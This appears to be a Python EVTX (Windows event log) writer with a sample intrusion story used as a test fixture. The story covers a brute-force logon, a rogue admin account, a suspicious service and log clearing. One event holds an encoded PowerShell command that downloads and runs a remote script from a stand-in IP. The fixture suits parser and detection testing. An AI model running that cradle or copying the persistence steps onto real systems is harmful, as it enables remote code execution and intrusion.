"""A small EVTX (Windows event log) writer for test fixtures and apps/data/sample.evtx.

Format-faithful subset: file header (4096 bytes, CRC32), 65536-byte chunks
(CRC32 of the header and of the records), event records (magic 0x2a2a0000,
FILETIME) holding binary XML: fragment header, template instances with
resident or referenced template definitions, substitution arrays, inline or
referenced element/attribute names (the chunk's string hash table is filled
in), and EventData as a nested BinXml (0x21) substitution with its own
template. Value types: string, uint8/16/32/64, int32, bool, GUID, FILETIME,
SID, hex32/hex64, binary, string array, null.
"""

from __future__ import annotations

import struct
import uuid
import zlib

FILETIME_EPOCH = 116444736000000000


def filetime(ts: float) -> int:
    return int(round(ts * 10_000_000)) + FILETIME_EPOCH


def sid_bytes(text: str) -> bytes:
    parts = text.split("-")
    revision, authority, subs = int(parts[1]), int(parts[2]), [int(x) for x in parts[3:]]
    return bytes([revision, len(subs)]) + authority.to_bytes(6, "big") + b"".join(s.to_bytes(4, "little") for s in subs)


def guid_bytes(text: str) -> bytes:
    return uuid.UUID(text.strip("{}")).bytes_le


def name_hash(name: str) -> int:
    h = 0
    for ch in name:
        h = (h * 65599 + ord(ch)) & 0xFFFF
    return h


class Value:
    """A typed substitution value."""

    def __init__(self, kind: int, raw: bytes):
        self.kind, self.raw = kind, raw

    @staticmethod
    def string(text):
        return Value(0x01, text.encode("utf-16-le"))

    @staticmethod
    def ansi(text):
        return Value(0x02, text.encode("latin-1"))

    @staticmethod
    def u8(n):
        return Value(0x04, struct.pack("<B", n))

    @staticmethod
    def u16(n):
        return Value(0x06, struct.pack("<H", n))

    @staticmethod
    def u32(n):
        return Value(0x08, struct.pack("<I", n))

    @staticmethod
    def i32(n):
        return Value(0x07, struct.pack("<i", n))

    @staticmethod
    def u64(n):
        return Value(0x0A, struct.pack("<Q", n))

    @staticmethod
    def boolean(flag):
        return Value(0x0D, struct.pack("<I", 1 if flag else 0))

    @staticmethod
    def binary(data):
        return Value(0x0E, bytes(data))

    @staticmethod
    def guid(text):
        return Value(0x0F, guid_bytes(text))

    @staticmethod
    def time(ts):
        return Value(0x11, struct.pack("<Q", filetime(ts)))

    @staticmethod
    def sid(text):
        return Value(0x13, sid_bytes(text))

    @staticmethod
    def hex32(n):
        return Value(0x14, struct.pack("<I", n))

    @staticmethod
    def hex64(n):
        return Value(0x15, struct.pack("<Q", n))

    @staticmethod
    def null():
        return Value(0x00, b"")

    @staticmethod
    def strings(items):
        return Value(0x81, b"".join(s.encode("utf-16-le") + b"\x00\x00" for s in items))

    @staticmethod
    def binxml(data):
        return Value(0x21, data)


class ChunkWriter:
    """Builds one 65536-byte chunk."""

    SIZE = 65536

    def __init__(self, first_record_number: int):
        self.body = bytearray(512)  # header (128) + string table (256) + template table (128)
        self.names = {}
        self.templates = {}
        self.string_buckets = [0] * 64
        self.template_buckets = [0] * 32
        self.first_number = first_record_number
        self.last_number = first_record_number - 1
        self.last_record_offset = 0

    def offset(self) -> int:
        return len(self.body)

    def snapshot(self):
        return (len(self.body), dict(self.names), dict(self.templates), list(self.string_buckets),
                list(self.template_buckets))

    def restore(self, snap):
        size, names, templates, sb, tb = snap
        del self.body[size:]
        self.names, self.templates, self.string_buckets, self.template_buckets = names, templates, sb, tb

    # -- names ------------------------------------------------------------------

    def name_ref(self, name: str, field_pos: int) -> bytes:
        """The 4-byte name offset. A new name is stored inline right after the offset
        field (so the offset is field_pos + 4) and chained into the hash table."""
        if name in self.names:
            return struct.pack("<I", self.names[name])
        off = field_pos + 4
        self.names[name] = off
        bucket = name_hash(name) % 64
        entry = struct.pack("<IHH", self.string_buckets[bucket], name_hash(name), len(name)) + \
            name.encode("utf-16-le") + b"\x00\x00"
        self.string_buckets[bucket] = off
        return struct.pack("<I", off) + entry

    # -- elements ---------------------------------------------------------------

    def element(self, name: str, attrs: list, children: list, pos: int) -> bytes:
        """Binary XML for one element starting at chunk offset `pos`.
        attrs: [(name, text | ("sub", id, type[, optional]))]
        children: ("sub", id, type) | ("text", str) | ("element", name, attrs, children)."""
        out = bytearray()
        out += bytes([0x41 if attrs else 0x01]) + struct.pack("<H", 0xFFFF)  # dependency id: none
        size_pos = len(out)
        out += b"\x00\x00\x00\x00"
        out += self.name_ref(name, pos + len(out))
        if attrs:
            attr_size_pos = len(out)
            out += b"\x00\x00\x00\x00"
            start = len(out)
            for i, (aname, avalue) in enumerate(attrs):
                out += bytes([0x46 if i < len(attrs) - 1 else 0x06])
                out += self.name_ref(aname, pos + len(out))
                out += self.value_token(avalue)
            struct.pack_into("<I", out, attr_size_pos, len(out) - start)
        if not children:
            out += b"\x03"
        else:
            out += b"\x02"
            for child in children:
                out += self.content(child, pos + len(out))
            out += b"\x04"
        struct.pack_into("<I", out, size_pos, len(out) - size_pos - 4)
        return bytes(out)

    def value_token(self, value) -> bytes:
        if isinstance(value, tuple) and value[0] == "sub":
            _, sid, kind, *rest = value
            optional = rest[0] if rest else False
            return bytes([0x0E if optional else 0x0D]) + struct.pack("<HB", sid, kind)
        if isinstance(value, str):
            return b"\x05\x01" + struct.pack("<H", len(value)) + value.encode("utf-16-le")
        raise TypeError(value)

    def content(self, child, pos: int) -> bytes:
        if child[0] == "sub":
            return self.value_token(child)
        if child[0] == "text":
            return self.value_token(child[1])
        if child[0] == "element":
            _, name, attrs, kids = child
            return self.element(name, attrs, kids, pos)
        raise TypeError(child)

    # -- templates ----------------------------------------------------------------

    def template_instance(self, key: str, guid: str, build_xml, values: list, pos: int) -> bytes:
        """Token 0x0c, template id, definition offset, the resident definition when first
        seen in this chunk, then the substitution array."""
        out = bytearray(b"\x0c\x01")
        guid_raw = guid_bytes(guid)
        template_id = struct.unpack_from("<I", guid_raw, 0)[0]
        out += struct.pack("<I", template_id)
        if key in self.templates:
            out += struct.pack("<I", self.templates[key])
        else:
            def_off = pos + len(out) + 4
            self.templates[key] = def_off
            out += struct.pack("<I", def_off)
            bucket = template_id % 32
            xml = b"\x0f\x01\x01\x00" + build_xml(def_off + 24 + 4) + b"\x00"
            out += struct.pack("<I", self.template_buckets[bucket]) + guid_raw + struct.pack("<I", len(xml)) + xml
            self.template_buckets[bucket] = def_off
        out += struct.pack("<I", len(values))
        for v in values:
            out += struct.pack("<HBB", len(v.raw), v.kind, 0)
        for v in values:
            out += v.raw
        return bytes(out)

    # -- records ----------------------------------------------------------------------

    def add_record(self, record_id: int, written: float, build_binxml) -> bool:
        snap = self.snapshot()
        pos = self.offset()
        binxml = b"\x0f\x01\x01\x00" + build_binxml(self, pos + 24 + 4) + b"\x00"
        size = 24 + len(binxml) + 4
        if pos + size > self.SIZE:
            self.restore(snap)
            return False
        self.body += struct.pack("<IIQQ", 0x00002A2A, size, record_id, filetime(written)) + binxml + struct.pack("<I", size)
        self.last_record_offset = pos
        self.last_number = record_id
        return True

    def finish(self) -> bytes:
        body = self.body
        records = bytes(body[512:])
        body += b"\x00" * (self.SIZE - len(body))
        struct.pack_into("<8sQQQQIIII", body, 0, b"ElfChnk\x00", self.first_number, self.last_number,
                         self.first_number, self.last_number, 128, self.last_record_offset, 512 + len(records),
                         zlib.crc32(records) & 0xFFFFFFFF)
        for i, off in enumerate(self.string_buckets):
            struct.pack_into("<I", body, 128 + 4 * i, off)
        for i, off in enumerate(self.template_buckets):
            struct.pack_into("<I", body, 384 + 4 * i, off)
        struct.pack_into("<I", body, 124, zlib.crc32(bytes(body[:120]) + bytes(body[128:512])) & 0xFFFFFFFF)
        return bytes(body)


SECURITY_GUID = "{54849625-5478-4994-a5ba-3e3b0328c30d}"
SYSTEM_GUID = "{3e4ef6ae-6b63-4d8a-9c10-2b7a8d1a0001}"
AUDIT_SUCCESS, AUDIT_FAILURE = 0x8020000000000000, 0x8010000000000000


def to_value(v) -> Value:
    if isinstance(v, Value):
        return v
    if isinstance(v, bool):
        return Value.boolean(v)
    if isinstance(v, int):
        return Value.u32(v) if 0 <= v < 2 ** 32 else Value.u64(v)
    if v is None:
        return Value.null()
    return Value.string(str(v))


def record_builder(event: dict):
    """A builder for one event map: EventID, Time (epoch), Computer, Channel, Provider,
    ProviderGuid?, Level?, Task?, Opcode?, Keywords?, RecordID, ProcessID?, ThreadID?,
    UserID? (SID text), Version?, EventData {name: value}."""
    data = event.get("EventData") or {}
    names = list(data.keys())
    provider = event["Provider"]
    inner_key = f"EventData:{provider}:{','.join(names)}"
    inner_guid = "{" + str(uuid.uuid5(uuid.NAMESPACE_DNS, inner_key)) + "}"

    def build(chunk: ChunkWriter, pos: int) -> bytes:
        def inner_xml(xml_pos):
            kids = [("element", "Data", [("Name", name)], [("sub", i, 0x01)]) for i, name in enumerate(names)]
            return chunk.element("EventData", [], kids, xml_pos)

        def outer_xml(xml_pos):
            system_kids = [
                ("element", "Provider", [("Name", ("sub", 0, 0x01)), ("Guid", ("sub", 1, 0x0F, True))], []),
                ("element", "EventID", [("Qualifiers", ("sub", 2, 0x06, True))], [("sub", 3, 0x06)]),
                ("element", "Version", [], [("sub", 4, 0x04)]),
                ("element", "Level", [], [("sub", 5, 0x04)]),
                ("element", "Task", [], [("sub", 6, 0x06)]),
                ("element", "Opcode", [], [("sub", 7, 0x04)]),
                ("element", "Keywords", [], [("sub", 8, 0x15)]),
                ("element", "TimeCreated", [("SystemTime", ("sub", 9, 0x11))], []),
                ("element", "EventRecordID", [], [("sub", 10, 0x0A)]),
                ("element", "Correlation", [("ActivityID", ("sub", 11, 0x0F, True))], []),
                ("element", "Execution", [("ProcessID", ("sub", 12, 0x08)), ("ThreadID", ("sub", 13, 0x08))], []),
                ("element", "Channel", [], [("sub", 14, 0x01)]),
                ("element", "Computer", [], [("sub", 15, 0x01)]),
                ("element", "Security", [("UserID", ("sub", 16, 0x13, True))], []),
            ]
            kids = [("element", "System", [], system_kids), ("sub", 17, 0x21)]
            return chunk.element("Event", [("xmlns", "http://schemas.microsoft.com/win/2004/08/events/event")],
                                 kids, xml_pos)

        # The nested EventData fragment is a BinXml substitution value; it is laid out at the
        # end of the outer substitution array, so its offsets are computed after the header.
        outer_values_head = [
            Value.string(provider),
            Value.guid(event["ProviderGuid"]) if event.get("ProviderGuid") else Value.null(),
            Value.u16(event["Qualifiers"]) if event.get("Qualifiers") is not None else Value.null(),
            Value.u16(event["EventID"]), Value.u8(event.get("Version", 0)), Value.u8(event.get("Level", 0)),
            Value.u16(event.get("Task", 0)), Value.u8(event.get("Opcode", 0)), Value.hex64(event.get("Keywords", 0)),
            Value.time(event["Time"]), Value.u64(event["RecordID"]),
            Value.guid(event["ActivityID"]) if event.get("ActivityID") else Value.null(),
            Value.u32(event.get("ProcessID", 4)), Value.u32(event.get("ThreadID", 100)),
            Value.string(event["Channel"]), Value.string(event["Computer"]),
            Value.sid(event["UserID"]) if event.get("UserID") else Value.null(),
        ]
        # The outer layout before its last value does not depend on that value, so probe
        # it with an empty nested fragment to learn where the nested fragment will start.
        snap0 = chunk.snapshot()
        probe = chunk.template_instance("System", SYSTEM_GUID, outer_xml, outer_values_head + [Value.binxml(b"")], pos)
        nested_pos = pos + len(probe)
        inner_values = [to_value(data[n]) for n in names]
        inner = b"\x0f\x01\x01\x00" + chunk.template_instance(inner_key, inner_guid, inner_xml, inner_values,
                                                                nested_pos + 4) + b"\x00"
        after = chunk.snapshot()  # names/templates as they are once outer + inner are both written
        chunk.restore(snap0)
        out = chunk.template_instance("System", SYSTEM_GUID, outer_xml, outer_values_head + [Value.binxml(inner)], pos)
        chunk.restore(after)
        return out

    return build


def build_evtx(events: list) -> bytes:
    """Write a whole EVTX file from a list of event maps (see record_builder)."""
    chunks = []
    chunk = ChunkWriter(1)
    number = 1
    for event in events:
        if not chunk.add_record(number, event["Time"], record_builder(event)):
            chunks.append(chunk.finish())
            chunk = ChunkWriter(number)
            if not chunk.add_record(number, event["Time"], record_builder(event)):
                raise ValueError("an event is too big for one chunk")
        number += 1
    chunks.append(chunk.finish())
    header = bytearray(4096)
    struct.pack_into("<8sQQQIHHHH", header, 0, b"ElfFile\x00", 0, len(chunks) - 1, number, 128, 1, 3, 4096, len(chunks))
    struct.pack_into("<I", header, 120, 0)  # flags: clean
    struct.pack_into("<I", header, 124, zlib.crc32(bytes(header[:120])) & 0xFFFFFFFF)
    return bytes(header) + b"".join(chunks)


# =============================================================================
# The sample story (apps/data/sample.evtx)
# =============================================================================

import datetime as _dt  # noqa: E402

T0 = _dt.datetime(2026, 3, 12, 8, 0, 0, tzinfo=_dt.timezone.utc).timestamp()
WS = "WS-FINANCE-07.corp.example"
DC = "DC01.corp.example"
SID_TANISHA = "S-1-5-21-1004336348-1177238915-682003330-1104"
SID_SYSTEM = "S-1-5-18"


def security(event_id, t, computer, data, success=True, record_id=0, user_sid=None, task=0, level=0):
    return {"EventID": event_id, "Time": t, "Computer": computer, "Channel": "Security",
            "Provider": "Microsoft-Windows-Security-Auditing", "ProviderGuid": SECURITY_GUID, "Version": 2,
            "Level": level, "Task": task, "Opcode": 0, "Keywords": AUDIT_SUCCESS if success else AUDIT_FAILURE,
            "RecordID": record_id, "ProcessID": 716, "ThreadID": 2300, "UserID": user_sid, "EventData": data}


def sample_events() -> list:
    events = []
    t = [T0]

    def tick(step=1.0):
        t[0] = round(t[0] + step, 3)
        return t[0]

    def add(ev):
        ev["RecordID"] = len(events) + 1
        events.append(ev)

    # 1. Normal morning: Tanisha logs on interactively, special privileges, a few processes.
    add(security(4624, tick(), WS, {
        "SubjectUserSid": Value.sid(SID_SYSTEM), "SubjectUserName": "WS-FINANCE-07$", "SubjectDomainName": "CORP",
        "SubjectLogonId": Value.hex64(0x3E7), "TargetUserSid": Value.sid(SID_TANISHA), "TargetUserName": "tanisha",
        "TargetDomainName": "CORP", "TargetLogonId": Value.hex64(0x1A2B3C), "LogonType": Value.u32(2),
        "LogonProcessName": "User32 ", "AuthenticationPackageName": "Negotiate", "WorkstationName": "WS-FINANCE-07",
        "LogonGuid": Value.guid("{11111111-2222-3333-4444-555555555555}"), "TransmittedServices": "-",
        "LmPackageName": "-", "KeyLength": Value.u32(0), "ProcessId": Value.hex64(0x2F4),
        "ProcessName": "C:\\Windows\\System32\\svchost.exe", "IpAddress": "127.0.0.1", "IpPort": "0",
        "ImpersonationLevel": "%%1833", "RestrictedAdminMode": "-", "TargetOutboundUserName": "-",
        "TargetOutboundDomainName": "-", "VirtualAccount": "%%1843", "TargetLinkedLogonId": Value.hex64(0),
        "ElevatedToken": "%%1842"}, task=12544))
    add(security(4672, tick(), WS, {"SubjectUserSid": Value.sid(SID_TANISHA), "SubjectUserName": "tanisha",
                                     "SubjectDomainName": "CORP", "SubjectLogonId": Value.hex64(0x1A2B3C),
                                     "PrivilegeList": "SeSecurityPrivilege\n\t\t\tSeBackupPrivilege"}, task=12548))
    for name in ("explorer.exe", "OUTLOOK.EXE", "EXCEL.EXE"):
        add(security(4688, tick(30), WS, {
            "SubjectUserSid": Value.sid(SID_TANISHA), "SubjectUserName": "tanisha", "SubjectDomainName": "CORP",
            "SubjectLogonId": Value.hex64(0x1A2B3C), "NewProcessId": Value.hex64(0x1234),
            "NewProcessName": f"C:\\Program Files\\Microsoft Office\\root\\Office16\\{name}" if name != "explorer.exe"
            else "C:\\Windows\\explorer.exe", "TokenElevationType": "%%1938", "ProcessId": Value.hex64(0x4F0),
            "CommandLine": f'"{name}"', "TargetUserSid": Value.sid("S-1-0-0"), "TargetUserName": "-",
            "TargetDomainName": "-", "TargetLogonId": Value.hex64(0), "ParentProcessName": "C:\\Windows\\explorer.exe",
            "MandatoryLabel": Value.sid("S-1-16-8192")}, task=13312))

    # 2. Brute force against the domain controller from 203.0.113.42, then a success.
    for i, user in enumerate(["administrator", "admin", "backup", "svc_sql", "tanisha", "helpdesk", "administrator",
                              "administrator", "root", "test", "administrator", "guest"]):
        add(security(4625, tick(0.7), DC, {
            "SubjectUserSid": Value.sid("S-1-0-0"), "SubjectUserName": "-", "SubjectDomainName": "-",
            "SubjectLogonId": Value.hex64(0), "TargetUserSid": Value.sid("S-1-0-0"), "TargetUserName": user,
            "TargetDomainName": "CORP", "Status": Value.hex32(0xC000006D), "FailureReason": "%%2313",
            "SubStatus": Value.hex32(0xC000006A), "LogonType": Value.u32(3), "LogonProcessName": "NtLmSsp ",
            "AuthenticationPackageName": "NTLM", "WorkstationName": "KALI", "TransmittedServices": "-",
            "LmPackageName": "-", "KeyLength": Value.u32(0), "ProcessId": Value.hex64(0), "ProcessName": "-",
            "IpAddress": "203.0.113.42", "IpPort": str(49152 + i)}, success=False, task=12544))
    add(security(4624, tick(0.7), DC, {
        "SubjectUserSid": Value.sid("S-1-0-0"), "SubjectUserName": "-", "SubjectDomainName": "-",
        "SubjectLogonId": Value.hex64(0), "TargetUserSid": Value.sid("S-1-5-21-1004336348-1177238915-682003330-500"),
        "TargetUserName": "administrator", "TargetDomainName": "CORP", "TargetLogonId": Value.hex64(0x5F00AA),
        "LogonType": Value.u32(3), "LogonProcessName": "NtLmSsp ", "AuthenticationPackageName": "NTLM",
        "WorkstationName": "KALI", "LogonGuid": Value.guid("{00000000-0000-0000-0000-000000000000}"),
        "TransmittedServices": "-", "LmPackageName": "NTLM V2", "KeyLength": Value.u32(128),
        "ProcessId": Value.hex64(0), "ProcessName": "-", "IpAddress": "203.0.113.42", "IpPort": "49170",
        "ImpersonationLevel": "%%1833", "RestrictedAdminMode": "-", "TargetOutboundUserName": "-",
        "TargetOutboundDomainName": "-", "VirtualAccount": "%%1843", "TargetLinkedLogonId": Value.hex64(0),
        "ElevatedToken": "%%1842"}, task=12544))

    # 3. Persistence: new user, added to Administrators, a service installed, then the log cleared.
    add(security(4720, tick(20), DC, {
        "TargetUserName": "sysupdate", "TargetDomainName": "CORP",
        "TargetSid": Value.sid("S-1-5-21-1004336348-1177238915-682003330-1205"),
        "SubjectUserSid": Value.sid("S-1-5-21-1004336348-1177238915-682003330-500"), "SubjectUserName": "administrator",
        "SubjectDomainName": "CORP", "SubjectLogonId": Value.hex64(0x5F00AA), "PrivilegeList": "-",
        "SamAccountName": "sysupdate", "DisplayName": "%%1793", "UserPrincipalName": "-", "HomeDirectory": "%%1793",
        "UserAccountControl": "%%2080 %%2082 %%2084", "AllowedToDelegateTo": "-"}, task=13824))
    add(security(4732, tick(2), DC, {
        "MemberName": "-", "MemberSid": Value.sid("S-1-5-21-1004336348-1177238915-682003330-1205"),
        "TargetUserName": "Administrators", "TargetDomainName": "Builtin", "TargetSid": Value.sid("S-1-5-32-544"),
        "SubjectUserSid": Value.sid("S-1-5-21-1004336348-1177238915-682003330-500"), "SubjectUserName": "administrator",
        "SubjectDomainName": "CORP", "SubjectLogonId": Value.hex64(0x5F00AA), "PrivilegeList": "-"}, task=13826))
    add(security(4688, tick(5), DC, {
        "SubjectUserSid": Value.sid("S-1-5-21-1004336348-1177238915-682003330-500"), "SubjectUserName": "administrator",
        "SubjectDomainName": "CORP", "SubjectLogonId": Value.hex64(0x5F00AA), "NewProcessId": Value.hex64(0x1A00),
        "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "TokenElevationType": "%%1937", "ProcessId": Value.hex64(0x3C8),
        "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMAAwAC8AcwB0AGEAZwBlADIALgBwAHMAMQAnACkA",
        "TargetUserSid": Value.sid("S-1-0-0"), "TargetUserName": "-", "TargetDomainName": "-",
        "TargetLogonId": Value.hex64(0), "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
        "MandatoryLabel": Value.sid("S-1-16-12288")}, task=13312))
    add({"EventID": 7045, "Time": tick(3), "Computer": DC, "Channel": "System", "Provider": "Service Control Manager",
         "ProviderGuid": "{555908d1-a6d7-4695-8e1e-26931d2012f4}", "Level": 4, "Task": 0, "Opcode": 0,
         "Keywords": 0x8080000000000000, "RecordID": 0, "ProcessID": 740, "ThreadID": 1200, "UserID": SID_SYSTEM,
         "Qualifiers": 16384, "EventData": {"ServiceName": "WinUpdateSvc", "ImagePath": "C:\\Users\\Public\\svchost.exe",
                                            "ServiceType": "user mode service", "StartType": "auto start",
                                            "AccountName": "LocalSystem"}})
    add(security(1102, tick(10), DC, {
        "SubjectUserSid": Value.sid("S-1-5-21-1004336348-1177238915-682003330-500"), "SubjectUserName": "administrator",
        "SubjectDomainName": "CORP", "SubjectLogonId": Value.hex64(0x5F00AA)}, task=104, user_sid=SID_SYSTEM))
    # A record that uses the rarer value types, so readers get exercised.
    add({"EventID": 1, "Time": tick(1), "Computer": WS, "Channel": "Microsoft-Windows-Sysmon/Operational",
         "Provider": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "Level": 4,
         "Task": 1, "Opcode": 0, "Keywords": 0x8000000000000000, "RecordID": 0, "ProcessID": 3200, "ThreadID": 4100,
         "UserID": SID_SYSTEM, "Version": 5, "EventData": {
             "RuleName": "-", "UtcTime": Value.time(t[0]), "ProcessGuid": Value.guid("{a1b2c3d4-0001-0002-0003-000000000004}"),
             "ProcessId": Value.u32(5120), "Image": "C:\\Users\\tanisha\\AppData\\Local\\Temp\\stage2.exe",
             "CommandLine": "stage2.exe --silent", "IntegrityLevel": "High", "Hashes": "SHA256=" + "ab" * 32,
             "ParentProcessId": Value.u32(0x1A00), "TerminalSessionId": Value.i32(1), "Elevated": Value.boolean(True),
             "Tags": Value.strings(["staging", "temp"]), "Blob": Value.binary(b"\x01\x02\x03\x04"),
             "Score": Value.u8(97), "Flags": Value.hex32(0x80000001), "Missing": None}})
    return events


def sample_evtx_bytes() -> bytes:
    return build_evtx(sample_events())
